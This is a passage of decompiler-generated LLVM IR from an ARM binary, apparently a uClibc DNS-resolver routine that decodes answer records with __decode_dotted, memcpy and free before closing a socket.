dec_label_pc_18e38:                               ; preds = %dec_label_pc_18dfc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_18e38, label %dec_label_pc_18e40, label %dec_label_pc_19164

dec_label_pc_18e40:                               ; preds = %dec_label_pc_18e38
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %tmp214, label %dec_label_pc_18e58, label %dec_label_pc_18e68

dec_label_pc_18e58:                               ; preds = %dec_label_pc_18e40
  %v0_18e58 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_18e60

dec_label_pc_18e60:                               ; preds = %dec_label_pc_18e2c, %dec_label_pc_18e58
  %storemerge2 = phi i32 [ %v0_18e58, %dec_label_pc_18e58 ], [ %v0_18e2c, %dec_label_pc_18e2c ]
  %storemerge = phi i32 [ 4, %dec_label_pc_18e58 ], [ 1, %dec_label_pc_18e2c ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v2_18e60 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_18e60, align 4
  br label %dec_label_pc_191ac

dec_label_pc_18e68:                               ; preds = %dec_label_pc_18e40
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_18e6c.pre = load i32, i32* @sl, align 4
  store i32 12, i32* @ip, align 4
  %v2_18e6c = add i32 %v0_18e6c.pre, 12
  store i32 %v2_18e6c, i32* @r4, align 4
  %v3_18e6c = icmp ugt i32 %v0_18e6c.pre, -13
  store i1 %v3_18e6c, i1* %cpsr_c.global-to-local, align 1
  %v9_18e6c = icmp eq i32 %v2_18e6c, 0
  br i1 %v9_18e6c, label %dec_label_pc_19164, label %dec_label_pc_18e74

dec_label_pc_18e74:                               ; preds = %dec_label_pc_18e68
  %v2_18e78 = add i32 %v5_18d9c, -12
  store i32 %v2_18e78, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp223 = icmp slt i32 %v2_18e78, 1
  br i1 %tmp223, label %dec_label_pc_19164, label %dec_label_pc_18e88

dec_label_pc_18e80thread-pre-split:               ; preds = %dec_label_pc_18ea4
  %v2_18eb015 = add i32 %v2_18e94, -1
  store i32 %v2_18eb015, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp224 = icmp slt i32 %v2_18eb015, 1
  br i1 %tmp224, label %dec_label_pc_19164, label %dec_label_pc_18e88

dec_label_pc_18e88:                               ; preds = %dec_label_pc_18e74, %dec_label_pc_18e80thread-pre-split
  %v1_18eac = phi i32 [ %v2_18eb015, %dec_label_pc_18e80thread-pre-split ], [ %v2_18e78, %dec_label_pc_18e74 ]
  %v0_18e88 = phi i32 [ %v2_18e9c, %dec_label_pc_18e80thread-pre-split ], [ %v2_18e6c, %dec_label_pc_18e74 ]
  %v1_18e88 = inttoptr i32 %v0_18e88 to i8*
  %v2_18e88 = load i8, i8* %v1_18e88, align 1
  %v3_18e88 = zext i8 %v2_18e88 to i32
  store i32 %v3_18e88, i32* %r3.global-to-local, align 4
  %v5_18e88 = add i32 %v0_18e88, 1
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18e8c = icmp eq i8 %v2_18e88, 0
  %v2_18e94 = sub i32 %v1_18eac, %v3_18e88
  store i32 %v2_18e94, i32* @lr, align 4
  %v1_18e98 = and i32 %v3_18e88, 192
  store i32 %v1_18e98, i32* @ip, align 4
  %v2_18e9c = add i32 %v3_18e88, %v5_18e88
  br i1 %v2_18e8c, label %dec_label_pc_18eb8, label %dec_label_pc_18ea4

dec_label_pc_18ea4:                               ; preds = %dec_label_pc_18e88
  %v2_18ea4 = icmp eq i32 %v1_18e98, 192
  store i1 %v2_18ea4, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_18ea4, label %.thread9, label %dec_label_pc_18e80thread-pre-split

.thread9:                                         ; preds = %dec_label_pc_18ea4
  %v2_18ea8 = add i32 %v0_18e88, 2
  %v2_18eac = add i32 %v1_18eac, -2
  store i32 %v2_18eac, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18eb8

dec_label_pc_18eb8:                               ; preds = %dec_label_pc_18e88, %.thread9
  %v1_18ec4 = phi i32 [ %v2_18ea8, %.thread9 ], [ %v5_18e88, %dec_label_pc_18e88 ]
  %v0_18eb8 = phi i32 [ %v2_18eac, %.thread9 ], [ %v1_18eac, %dec_label_pc_18e88 ]
  %v1_18eb8 = add i32 %v0_18eb8, -3
  %v2_18eb8 = icmp ugt i32 %v0_18eb8, 2
  store i1 %v2_18eb8, i1* %cpsr_c.global-to-local, align 1
  %v3_18eb8 = sub i32 2, %v0_18eb8
  %v4_18eb8 = and i32 %v3_18eb8, %v0_18eb8
  %v5_18eb8 = icmp slt i32 %v4_18eb8, 0
  %v6_18eb8 = icmp slt i32 %v1_18eb8, 0
  %v7_18eb8 = icmp eq i32 %v0_18eb8, 3
  %v3_18ebc = xor i1 %v6_18eb8, %v5_18eb8
  %v4_18ebc = or i1 %v7_18eb8, %v3_18ebc
  br i1 %v4_18ebc, label %dec_label_pc_19164, label %dec_label_pc_18ec0

dec_label_pc_18ec0:                               ; preds = %dec_label_pc_18eb8
  %v1_18ec0 = sub i32 -8, %v0_18e6c.pre
  %v2_18ec4 = add i32 %v1_18ec4, %v1_18ec0
  store i32 %v2_18ec4, i32* %r3.global-to-local, align 4
  %v3_18ec4 = icmp ult i32 %v2_18ec4, %v1_18ec0
  store i1 %v3_18ec4, i1* %cpsr_c.global-to-local, align 1
  %v8_18ec4 = icmp slt i32 %v2_18ec4, 0
  br i1 %v8_18ec4, label %dec_label_pc_19164, label %dec_label_pc_18ee8

dec_label_pc_18ee8:                               ; preds = %dec_label_pc_18ec0
  %v2_18ed0 = add i32 %v2_18ec4, 12
  store i32 %v2_18ed0, i32* %r1.global-to-local, align 4
  store i32 %v2_18ef0, i32* @r5, align 4
  store i32 %v2_18ef4, i32* @r7, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br i1 %v5_1913856, label %dec_label_pc_18f0c, label %dec_label_pc_1913c

dec_label_pc_18f0c:                               ; preds = %dec_label_pc_18ee8, %dec_label_pc_19114.dec_label_pc_18f0c_crit_edge
  %v0_18f10 = phi i32 [ %v0_18f10.pre, %dec_label_pc_19114.dec_label_pc_18f0c_crit_edge ], [ %v0_18e6c.pre, %dec_label_pc_18ee8 ]
  %stack_var_-460.364 = phi i32 [ %v2_1911c, %dec_label_pc_19114.dec_label_pc_18f0c_crit_edge ], [ %v2_18ed0, %dec_label_pc_18ee8 ]
  %stack_var_-452.061 = phi i32 [ %v1_19120, %dec_label_pc_19114.dec_label_pc_18f0c_crit_edge ], [ 0, %dec_label_pc_18ee8 ]
  %stack_var_-480.260 = phi i32 [ %stack_var_-480.1, %dec_label_pc_19114.dec_label_pc_18f0c_crit_edge ], [ 1, %dec_label_pc_18ee8 ]
  store i32 256, i32* @ip, align 4
  store i32 %stack_var_-460.364, i32* @r1, align 4
  store i32 %v2_18ef0, i32* %r3.global-to-local, align 4
  %v5_18f24 = call i32 @__decode_dotted(i32 %v0_18f10, i32 %stack_var_-460.364, i32 %v5_18d9c, i32 %v2_18ef0, i32 256)
  store i32 %v5_18f24, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18f28 = icmp slt i32 %v5_18f24, 0
  br i1 %v1_18f28, label %dec_label_pc_18ff8, label %dec_label_pc_18f30

dec_label_pc_18f30:                               ; preds = %dec_label_pc_18f0c
  store i32 %stack_var_-460.364, i32* %r1.global-to-local, align 4
  %v1_18f38 = add i32 %v5_18f24, 10
  store i32 %v1_18f38, i32* @sb, align 4
  %v2_18f3c = sub i32 %v5_18d9c, %stack_var_-460.364
  %v2_18f40 = sub i32 %v2_18f3c, %v1_18f38
  store i32 %v2_18f40, i32* %r3.global-to-local, align 4
  %v3_18f40 = icmp uge i32 %v2_18f3c, %v1_18f38
  store i1 %v3_18f40, i1* %cpsr_c.global-to-local, align 1
  %v8_18f40 = icmp slt i32 %v2_18f40, 0
  br i1 %v8_18f40, label %dec_label_pc_18ff0.thread, label %dec_label_pc_18f50

dec_label_pc_18ff0.thread:                        ; preds = %dec_label_pc_18f30
  store i32 %v2_18f40, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_18ff8

dec_label_pc_18f50:                               ; preds = %dec_label_pc_18f30
  %v2_18f54 = call i32 @__GI_strdup(i8* %v1_18f54)
  %v0_18f5c = load i32, i32* @r4, align 4
  %v2_18f5c = add i32 %v0_18f5c, %stack_var_-460.364
  %v0_18f60 = load i32, i32* @sl, align 4
  %v2_18f60 = add i32 %v0_18f60, %v2_18f5c
  store i32 %v2_18f60, i32* %r1.global-to-local, align 4
  %v1_18f64 = add i32 %v2_18f60, 2
  store i32 %v1_18f64, i32* %ip.global-to-local, align 4
  %v1_18f68 = add i32 %v2_18f60, 4
  store i32 %v1_18f68, i32* %r3.global-to-local, align 4
  %v1_18f6c = add i32 %v2_18f60, 5
  %v2_18f6c = inttoptr i32 %v1_18f6c to i8*
  %v3_18f6c = load i8, i8* %v2_18f6c, align 1
  %v4_18f6c = zext i8 %v3_18f6c to i32
  %v1_18f74 = add i32 %v2_18f60, 8
  %v2_18f74 = inttoptr i32 %v1_18f74 to i8*
  %v3_18f74 = load i8, i8* %v2_18f74, align 1
  %v4_18f74 = zext i8 %v3_18f74 to i32
  %v1_18f80 = add i32 %v2_18f60, 6
  %v2_18f80 = inttoptr i32 %v1_18f80 to i8*
  %v3_18f80 = load i8, i8* %v2_18f80, align 1
  %v4_18f80 = zext i8 %v3_18f80 to i32
  store i32 %v4_18f80, i32* %r3.global-to-local, align 4
  %v1_18f84 = add i32 %v2_18f60, 9
  %v2_18f84 = inttoptr i32 %v1_18f84 to i8*
  %v3_18f84 = load i8, i8* %v2_18f84, align 1
  %v4_18f84 = zext i8 %v3_18f84 to i32
  %v3_18f8c = inttoptr i32 %v2_18f60 to i8*
  %v4_18f8c = load i8, i8* %v3_18f8c, align 1
  %v6_18f8c = zext i8 %v4_18f8c to i32
  %v1_18f90 = add i32 %v2_18f60, 3
  %v2_18f90 = inttoptr i32 %v1_18f90 to i8*
  %v3_18f90 = load i8, i8* %v2_18f90, align 1
  %v4_18f90 = zext i8 %v3_18f90 to i32
  store i32 %v4_18f90, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v2_18f98 = inttoptr i32 %v1_18f64 to i8*
  %v3_18f98 = load i8, i8* %v2_18f98, align 1
  %v4_18f98 = zext i8 %v3_18f98 to i32
  store i32 %v4_18f98, i32* %ip.global-to-local, align 4
  %v1_18f9c = add i32 %v2_18f60, 1
  %v2_18f9c = inttoptr i32 %v1_18f9c to i8*
  %v3_18f9c = load i8, i8* %v2_18f9c, align 1
  %v4_18f9c = zext i8 %v3_18f9c to i32
  %v4_18fa0 = mul nuw nsw i32 %v4_18f74, 256
  %v5_18fa0 = or i32 %v4_18f84, %v4_18fa0
  store i32 %v5_18fa0, i32* @r6, align 4
  store i32 %v4_18f6c, i32* @r7, align 4
  %v4_18fa8 = mul nuw nsw i32 %v6_18f8c, 256
  %v5_18fa8 = or i32 %v4_18f9c, %v4_18fa8
  store i32 %v5_18fa8, i32* @lr, align 4
  %v4_18fac = mul nuw nsw i32 %v4_18f98, 256
  %v5_18fac = or i32 %v4_18fac, %v4_18f90
  store i32 %v5_18fac, i32* %r3.global-to-local, align 4
  store i32 %v2_18f40, i32* @r5, align 4
  store i32 %v4_18f80, i32* @ip, align 4
  %v1_18fc0 = add i32 %v2_18f60, 10
  store i32 %v1_18fc0, i32* %r1.global-to-local, align 4
  %v1_18fc4 = add i32 %v2_18f5c, 10
  store i32 %v1_18fc4, i32* @r4, align 4
  %v2_18fc8 = sub i32 %v2_18f40, %v5_18fa0
  %v3_18fc8 = icmp uge i32 %v2_18f40, %v5_18fa0
  store i1 %v3_18fc8, i1* %cpsr_c.global-to-local, align 1
  %tmp226 = sub i32 0, %v2_18fc8
  %v6_18fc8 = and i32 %v2_18f40, %tmp226
  %v7_18fc8 = icmp slt i32 %v6_18fc8, 0
  %v8_18fc8 = icmp slt i32 %v2_18fc8, 0
  store i32 %v2_18f54, i32* %stack_var_-144, align 4
  %v2_18fe8 = xor i1 %v8_18fc8, %v7_18fc8
  br i1 %v2_18fe8, label %dec_label_pc_18ff8, label %dec_label_pc_18ff0

dec_label_pc_18ff0:                               ; preds = %dec_label_pc_18f50
  %v0_18fec = load i32, i32* @sb, align 4
  %v2_18fec = add i32 %v0_18fec, %v5_18fa0
  store i32 %v2_18fec, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18ff0 = icmp slt i32 %v2_18fec, 0
  br i1 %v1_18ff0, label %dec_label_pc_18ff8, label %dec_label_pc_19014

dec_label_pc_18ff8:                               ; preds = %dec_label_pc_18ff0, %dec_label_pc_18f50, %dec_label_pc_18f0c, %dec_label_pc_18ff0.thread
  store i32 %stack_var_-452.061, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18ffc = icmp eq i32 %stack_var_-452.061, 0
  br i1 %v2_18ffc, label %dec_label_pc_19164, label %dec_label_pc_19004

dec_label_pc_19004:                               ; preds = %dec_label_pc_18ff8
  store i32 %tmp144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_19008, label %dec_label_pc_19164, label %dec_label_pc_1913c

dec_label_pc_19014:                               ; preds = %dec_label_pc_18ff0
  store i32 %stack_var_-480.260, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_19018 = icmp eq i32 %stack_var_-480.260, 0
  br i1 %v2_19018, label %dec_label_pc_190bc, label %dec_label_pc_19020

dec_label_pc_19020:                               ; preds = %dec_label_pc_19014
  %v0_19020 = load i32, i32* @fp, align 4
  %v1_19020 = add i32 %v0_19020, 28
  store i32 %v1_19020, i32* %r3.global-to-local, align 4
  %v1_19024 = inttoptr i32 %v1_19020 to i32*
  %v2_19024 = load i32, i32* %v1_19024, align 4
  store i32 %v2_19024, i32* @r3, align 4
  %v3_19024 = add i32 %v0_19020, 32
  %v4_19024 = inttoptr i32 %v3_19024 to i32*
  %v5_19024 = load i32, i32* %v4_19024, align 4
  store i32 %v5_19024, i32* @ip, align 4
  %v6_19024 = add i32 %v0_19020, 36
  %v7_19024 = inttoptr i32 %v6_19024 to i32*
  %v8_19024 = load i32, i32* %v7_19024, align 4
  store i32 %v8_19024, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v0_19020, i32* @r0, align 4
  store i32 %v2_18ef4, i32* @r1, align 4
  %v0_19040 = call i32 @memcpy()
  %v0_19044 = load i32, i32* @fp, align 4
  %v1_19044 = add i32 %v0_19044, 4
  %v2_19044 = inttoptr i32 %v1_19044 to i32*
  %v3_19044 = load i32, i32* %v2_19044, align 4
  %v2_19048 = icmp ugt i32 %v3_19044, 23
  store i1 %v2_19048, i1* %cpsr_c.global-to-local, align 1
  %v7_19048 = icmp eq i32 %v3_19044, 24
  br i1 %v7_19048, label %dec_label_pc_1906c, label %dec_label_pc_19050

dec_label_pc_19050:                               ; preds = %dec_label_pc_19020
  %v1_19050 = add i32 %v0_19044, 28
  %v2_19050 = inttoptr i32 %v1_19050 to i32*
  %v3_19050 = load i32, i32* %v2_19050, align 4
  store i32 %v3_19050, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_19054 = icmp eq i32 %v3_19050, 0
  br i1 %v2_19054, label %dec_label_pc_1913c, label %dec_label_pc_1905c

dec_label_pc_1905c:                               ; preds = %dec_label_pc_19050
  store i1 %v2_19060, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_19060, label %dec_label_pc_1906c, label %bb227

bb227:                                            ; preds = %dec_label_pc_1905c
  store i1 %v3_19064, i1* %cpsr_c.global-to-local, align 1
  br i1 %v8_19064, label %dec_label_pc_1906c, label %dec_label_pc_1913c

dec_label_pc_1906c:                               ; preds = %dec_label_pc_1905c, %bb227, %dec_label_pc_19020
  store i32 %v0_18a44, i32* %r1.global-to-local, align 4
  %v3_19070 = icmp uge i32 %v3_19044, %v0_18a44
  store i1 %v3_19070, i1* %cpsr_c.global-to-local, align 1
  %v9_19070 = icmp eq i32 %v3_19044, %v0_18a44
  br i1 %v9_19070, label %dec_label_pc_19080, label %bb228

bb228:                                            ; preds = %dec_label_pc_1906c
  br label %dec_label_pc_19114

dec_label_pc_19080:                               ; preds = %dec_label_pc_1906c
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-452.061, i32* @r5, align 4
  %v1_19088 = add i32 %v0_19044, 16
  %v2_19088 = inttoptr i32 %v1_19088 to i32*
  %v3_19088 = load i32, i32* %v2_19088, align 4
  %v2_1908c = sub i32 %tmp159, %stack_var_-452.061
  %v1_19090 = add i32 %v2_1908c, -1
  store i32 %v1_19090, i32* %r3.global-to-local, align 4
  %v1_19094 = add i32 %v3_19088, 4
  %v2_19098 = mul i32 %v1_19094, %v1_19090
  store i32 %v2_19098, i32* %r1.global-to-local, align 4
  %v1_1909c = add i32 %v0_19044, 32
  %v2_1909c = inttoptr i32 %v1_1909c to i32*
  %v3_1909c = load i32, i32* %v2_1909c, align 4
  %v3_190a0 = icmp uge i32 %v2_19098, %v3_1909c
  store i1 %v3_190a0, i1* %cpsr_c.global-to-local, align 1
  %v2_190a4 = add i32 %v0_19044, 36
  %v3_190a4 = inttoptr i32 %v2_190a4 to i32*
  store i32 %v1_19090, i32* %v3_190a4, align 4
  %tmp286 = icmp ugt i32 %v2_19098, %v3_1909c
  br i1 %tmp286, label %dec_label_pc_1913c, label %dec_label_pc_190ac

dec_label_pc_190ac:                               ; preds = %dec_label_pc_19080
  store i32 0, i32* @r7, align 4
  %v1_190b4 = load i32, i32* @fp, align 4
  %v2_190b4 = add i32 %v1_190b4, 36
  %v3_190b4 = inttoptr i32 %v2_190b4 to i32*
  store i32 0, i32* %v3_190b4, align 4
  br label %dec_label_pc_19114

dec_label_pc_190bc:                               ; preds = %dec_label_pc_19014
  store i32 %v2_18f54, i32* @r0, align 4
  %v0_190c0 = call i32 @free()
  store i32 %v5_18fa8, i32* %r3.global-to-local, align 4
  store i32 %v0_18a44, i32* @ip, align 4
  %v3_190cc = icmp uge i32 %v5_18fa8, %v0_18a44
  store i1 %v3_190cc, i1* %cpsr_c.global-to-local, align 1
  %v9_190cc = icmp eq i32 %v5_18fa8, %v0_18a44
  br i1 %v9_190cc, label %dec_label_pc_190d4, label %dec_label_pc_19114

dec_label_pc_190d4:                               ; preds = %dec_label_pc_190bc
  %v0_190d4 = load i32, i32* @fp, align 4
  %v1_190d4 = add i32 %v0_190d4, 16
  %v2_190d4 = inttoptr i32 %v1_190d4 to i32*
  %v3_190d4 = load i32, i32* %v2_190d4, align 4
  store i32 %v3_190d4, i32* %r1.global-to-local, align 4
  store i32 %v5_18fa0, i32* %r3.global-to-local, align 4
  %v3_190dc = icmp uge i32 %v3_190d4, %v5_18fa0
  store i1 %v3_190dc, i1* %cpsr_c.global-to-local, align 1
  %v9_190dc = icmp eq i32 %v3_190d4, %v5_18fa0
  br i1 %v9_190dc, label %dec_label_pc_190f0, label %dec_label_pc_190e4

dec_label_pc_190e4:                               ; preds = %dec_label_pc_190d4
  %v1_190e4 = inttoptr i32 %v0_190d4 to i32*
  %v2_190e4 = load i32, i32* %v1_190e4, align 4
  store i32 %v2_190e4, i32* @r0, align 4
  %v0_190e8 = call i32 @free()
  br label %dec_label_pc_19164

dec_label_pc_190f0:                               ; preds = %dec_label_pc_190d4
  %v1_190f0 = add i32 %v0_190d4, 36
  %v2_190f0 = inttoptr i32 %v1_190f0 to i32*
  %v3_190f0 = load i32, i32* %v2_190f0, align 4
  %v1_190f4 = add i32 %v0_190d4, 28
  %v2_190f4 = inttoptr i32 %v1_190f4 to i32*
  %v3_190f4 = load i32, i32* %v2_190f4, align 4
  store i32 %v3_190f4, i32* @r3, align 4
  %v3_190f8 = mul i32 %v3_190f0, %v5_18fa0
  %v4_190f8 = add i32 %v3_190f4, %v3_190f8
  store i32 %v4_190f8, i32* @r0, align 4
  store i32 %v5_18fa0, i32* @r2, align 4
  store i32 %v1_18fc0, i32* @r1, align 4
  %v0_19104 = call i32 @memcpy()
  %v0_19108 = load i32, i32* @fp, align 4
  %v1_19108 = add i32 %v0_19108, 36
  %v2_19108 = inttoptr i32 %v1_19108 to i32*
  %v3_19108 = load i32, i32* %v2_19108, align 4
  %v1_1910c = add i32 %v3_19108, 1
  store i32 %v1_1910c, i32* %r3.global-to-local, align 4
  store i32 %v1_1910c, i32* %v2_19108, align 4
  br label %dec_label_pc_19114

dec_label_pc_19114:                               ; preds = %bb228, %dec_label_pc_190bc, %dec_label_pc_190ac, %dec_label_pc_190f0
  %stack_var_-480.1 = phi i32 [ 0, %dec_label_pc_190f0 ], [ 0, %dec_label_pc_190bc ], [ 0, %dec_label_pc_190ac ], [ 1, %bb228 ]
  %v1_1911c = load i32, i32* @r4, align 4
  %v1_19120 = add nuw nsw i32 %stack_var_-452.061, 1
  store i32 %v1_19120, i32* %r1.global-to-local, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  %v3_19134 = icmp uge i32 %v1_19120, %tmp159
  store i1 %v3_19134, i1* %cpsr_c.global-to-local, align 1
  %v5_19138 = icmp slt i32 %v1_19120, %tmp159
  br i1 %v5_19138, label %dec_label_pc_19114.dec_label_pc_18f0c_crit_edge, label %dec_label_pc_1913c

dec_label_pc_19114.dec_label_pc_18f0c_crit_edge:  ; preds = %dec_label_pc_19114
  %v2_1911c = add i32 %v1_1911c, %stack_var_-460.364
  %v0_18f10.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_18f0c

dec_label_pc_1913c:                               ; preds = %dec_label_pc_19004, %dec_label_pc_18ee8, %dec_label_pc_19114, %dec_label_pc_19050, %dec_label_pc_19080, %bb227
  %v1_19140 = call i32 @__GI_close(i32 %v3_18d14)
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_19148 = icmp eq i32 %arg3, 0
  br i1 %v2_19148, label %.thread21, label %bb230

bb230:                                            ; preds = %dec_label_pc_1913c
  %v1_19150 = load i32, i32* @sl, align 4
  %v3_1914c = inttoptr i32 %arg3 to i32*
  store i32 %v1_19150, i32* %v3_1914c, align 4
  br label %bb231

.thread21:                                        ; preds = %dec_label_pc_1913c
  br label %bb231

bb231:                                            ; preds = %bb230, %.thread21
  store i32 ptrtoint (i32* @global_var_19158.945 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_19148, i32 ptrtoint (i32* @global_var_1375c.598 to i32))
  store i32 %v1_18a8c, i32* @r0, align 4
  %v0_1915c = call i32 @free()
  br label %dec_label_pc_191cc

dec_label_pc_19164:                               ; preds = %thread-pre-split, %dec_label_pc_18d60, %dec_label_pc_18ec0, %dec_label_pc_18eb8, %dec_label_pc_18e68, %dec_label_pc_18e74, %dec_label_pc_18e80thread-pre-split, %thread-pre-split.thread, %dec_label_pc_18e38, %dec_label_pc_19004, %dec_label_pc_18ff8, %dec_label_pc_18d24, %dec_label_pc_18d04, %dec_label_pc_190e4
  %v1_19168 = add i32 %v0_18c28, 1
  store i32 %v1_19168, i32* @r5, align 4
  br label %dec_label_pc_19174

dec_label_pc_19174:                               ; preds = %.thread7, %dec_label_pc_19164
  %storemerge22 = phi i32 [ -1, %dec_label_pc_19164 ], [ %v7_18e24, %.thread7 ]
  %stack_var_-468.2 = phi i32 [ %v1_19168, %dec_label_pc_19164 ], [ %v0_18c28, %.thread7 ]
  store i32 %storemerge22, i32* @sb, align 4
  %v1_19178 = add i32 %stack_var_-476.1, -1
  store i32 %v1_19178, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp232 = icmp slt i32 %v1_19178, 1
  br i1 %tmp232, label %dec_label_pc_19194, label %dec_label_pc_18b2c

dec_label_pc_1918c:                               ; preds = %dec_label_pc_18cd8, %bb218, %bb213, %.thread5, %dec_label_pc_18aa8
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_19194

dec_label_pc_19194:                               ; preds = %dec_label_pc_19174, %.thread132, %dec_label_pc_1918c
  %stack_var_-472.1 = phi i32 [ %v1_18a8c, %dec_label_pc_1918c ], [ 0, %.thread132 ], [ %v1_18a8c, %dec_label_pc_19174 ]
  %stack_var_-488.2 = phi i32 [ -1, %dec_label_pc_1918c ], [ -1, %.thread132 ], [ %v3_18d14, %dec_label_pc_19174 ]
  %v0_19194 = call i32 @__GI___h_errno_location()
  store i32 %stack_var_-488.2, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_191a0 = icmp eq i32 %stack_var_-488.2, -1
  store i1 %v2_191a0, i1* %cpsr_c.global-to-local, align 1
  %v7_191a0 = icmp eq i32 %stack_var_-488.2, -1
  %v2_191a4 = inttoptr i32 %v0_19194 to i32*
  store i32 -1, i32* %v2_191a4, align 4
  br i1 %v7_191a0, label %dec_label_pc_191b4, label %dec_label_pc_191ac

dec_label_pc_191ac:                               ; preds = %dec_label_pc_19194, %dec_label_pc_18e60
  %stack_var_-472.2 = phi i32 [ %stack_var_-472.1, %dec_label_pc_19194 ], [ %v1_18a8c, %dec_label_pc_18e60 ]
  %stack_var_-488.3 = phi i32 [ %stack_var_-488.2, %dec_label_pc_19194 ], [ %v3_18d14, %dec_label_pc_18e60 ]
  %v1_191b0 = call i32 @__GI_close(i32 %stack_var_-488.3)
  br label %dec_label_pc_191b4

dec_label_pc_191b4:                               ; preds = %dec_label_pc_19194, %dec_label_pc_191ac
  %stack_var_-472.3 = phi i32 [ %stack_var_-472.1, %dec_label_pc_19194 ], [ %stack_var_-472.2, %dec_label_pc_191ac ]
  store i32 %stack_var_-472.3, i32* @r0, align 4
  %v0_191b8 = call i32 @free()
  %v0_191bc = load i32, i32* @sl, align 4
  store i32 %v0_191bc, i32* @r0, align 4
  %v0_191c0 = call i32 @free()
  br label %dec_label_pc_191cc

dec_label_pc_191cc:                               ; preds = %bb231, %dec_label_pc_191b4
  %stack_var_-484.0 = phi i32 [ -1, %dec_label_pc_191b4 ], [ %v5_18d9c, %bb231 ]
  store i32 %v3_18a30, i32* @r4, align 4
  store i32 %v6_18a30, i32* @r5, align 4
  store i32 %v9_18a30, i32* @r6, align 4
  store i32 %v12_18a30, i32* @r7, align 4
  store i32 %v15_18a30, i32* @r8, align 4
  store i32 %v18_18a30, i32* @sb, align 4
  store i32 %v21_18a30, i32* @sl, align 4
  store i32 %v24_18a30, i32* @fp, align 4
  store i32 %v27_18a30, i32* @lr, align 4
  ret i32 %stack_var_-484.0

; uselistorder directives
  uselistorder i32 %stack_var_-488.2, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-472.1, { 1, 0 }
  uselistorder i32 %v1_19178, { 1, 2, 0 }
  uselistorder i32 %v1_19120, { 1, 2, 3, 0 }
  uselistorder i32 %v0_190d4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_19090, { 1, 0, 2 }
  uselistorder i32 %v2_18fc8, { 1, 0 }
  uselistorder i32 %v5_18fa0, { 5, 0, 2, 3, 4, 1, 7, 6, 8 }
  uselistorder i32 %v2_18f60, { 3, 4, 0, 5, 6, 1, 2, 7, 8, 9, 10 }
  uselistorder i32 %v2_18f5c, { 1, 0 }
  uselistorder i32 %v2_18f40, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32 %v2_18f3c, { 1, 0 }
  uselistorder i32 %v1_18f38, { 1, 0, 2 }
  uselistorder i32 %stack_var_-452.061, { 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-460.364, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32 %v0_18eb8, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_18e94, { 1, 0 }
  uselistorder i32 %v3_18e88, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18e88, { 0, 2, 1 }
  uselistorder i32 %v2_18e78, { 0, 2, 1 }
  uselistorder i1 %v7_18dac, { 1, 0 }
  uselistorder i32 %v1_18dac, { 1, 0 }
  uselistorder i32 %v0_18dac, { 1, 0 }
  uselistorder i32 %v5_18d9c, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v3_18d14, { 1, 0, 2, 9, 7, 6, 5, 8, 4, 10, 11, 3 }
  uselistorder i32 %v6_18ccc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_18c58, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_18c40, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32 %v1_18c34, { 1, 0 }
  uselistorder i32 %v0_18c28, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-464.1, { 1, 0 }
  uselistorder i32 %v0_18be0, { 1, 0, 2, 3, 4 }
  uselistorder i1 %v7_18b30, { 1, 0 }
  uselistorder i32 %v1_18b34, { 0, 2, 1 }
  uselistorder i32 %stack_var_-468.0, { 0, 2, 1 }
  uselistorder i32 %v2_18ef0, { 1, 0, 2 }
  uselistorder i32 %v1_18e00, { 2, 0, 1 }
  uselistorder i32 %v2_18c88, { 1, 0, 2 }
  uselistorder i32 %v2_18c60, { 1, 0 }
  uselistorder i32 %v0_18aa8, { 1, 0, 2 }
  uselistorder i32 %v1_18a8c, { 7, 0, 3, 6, 4, 8, 1, 9, 2, 5, 10, 11 }
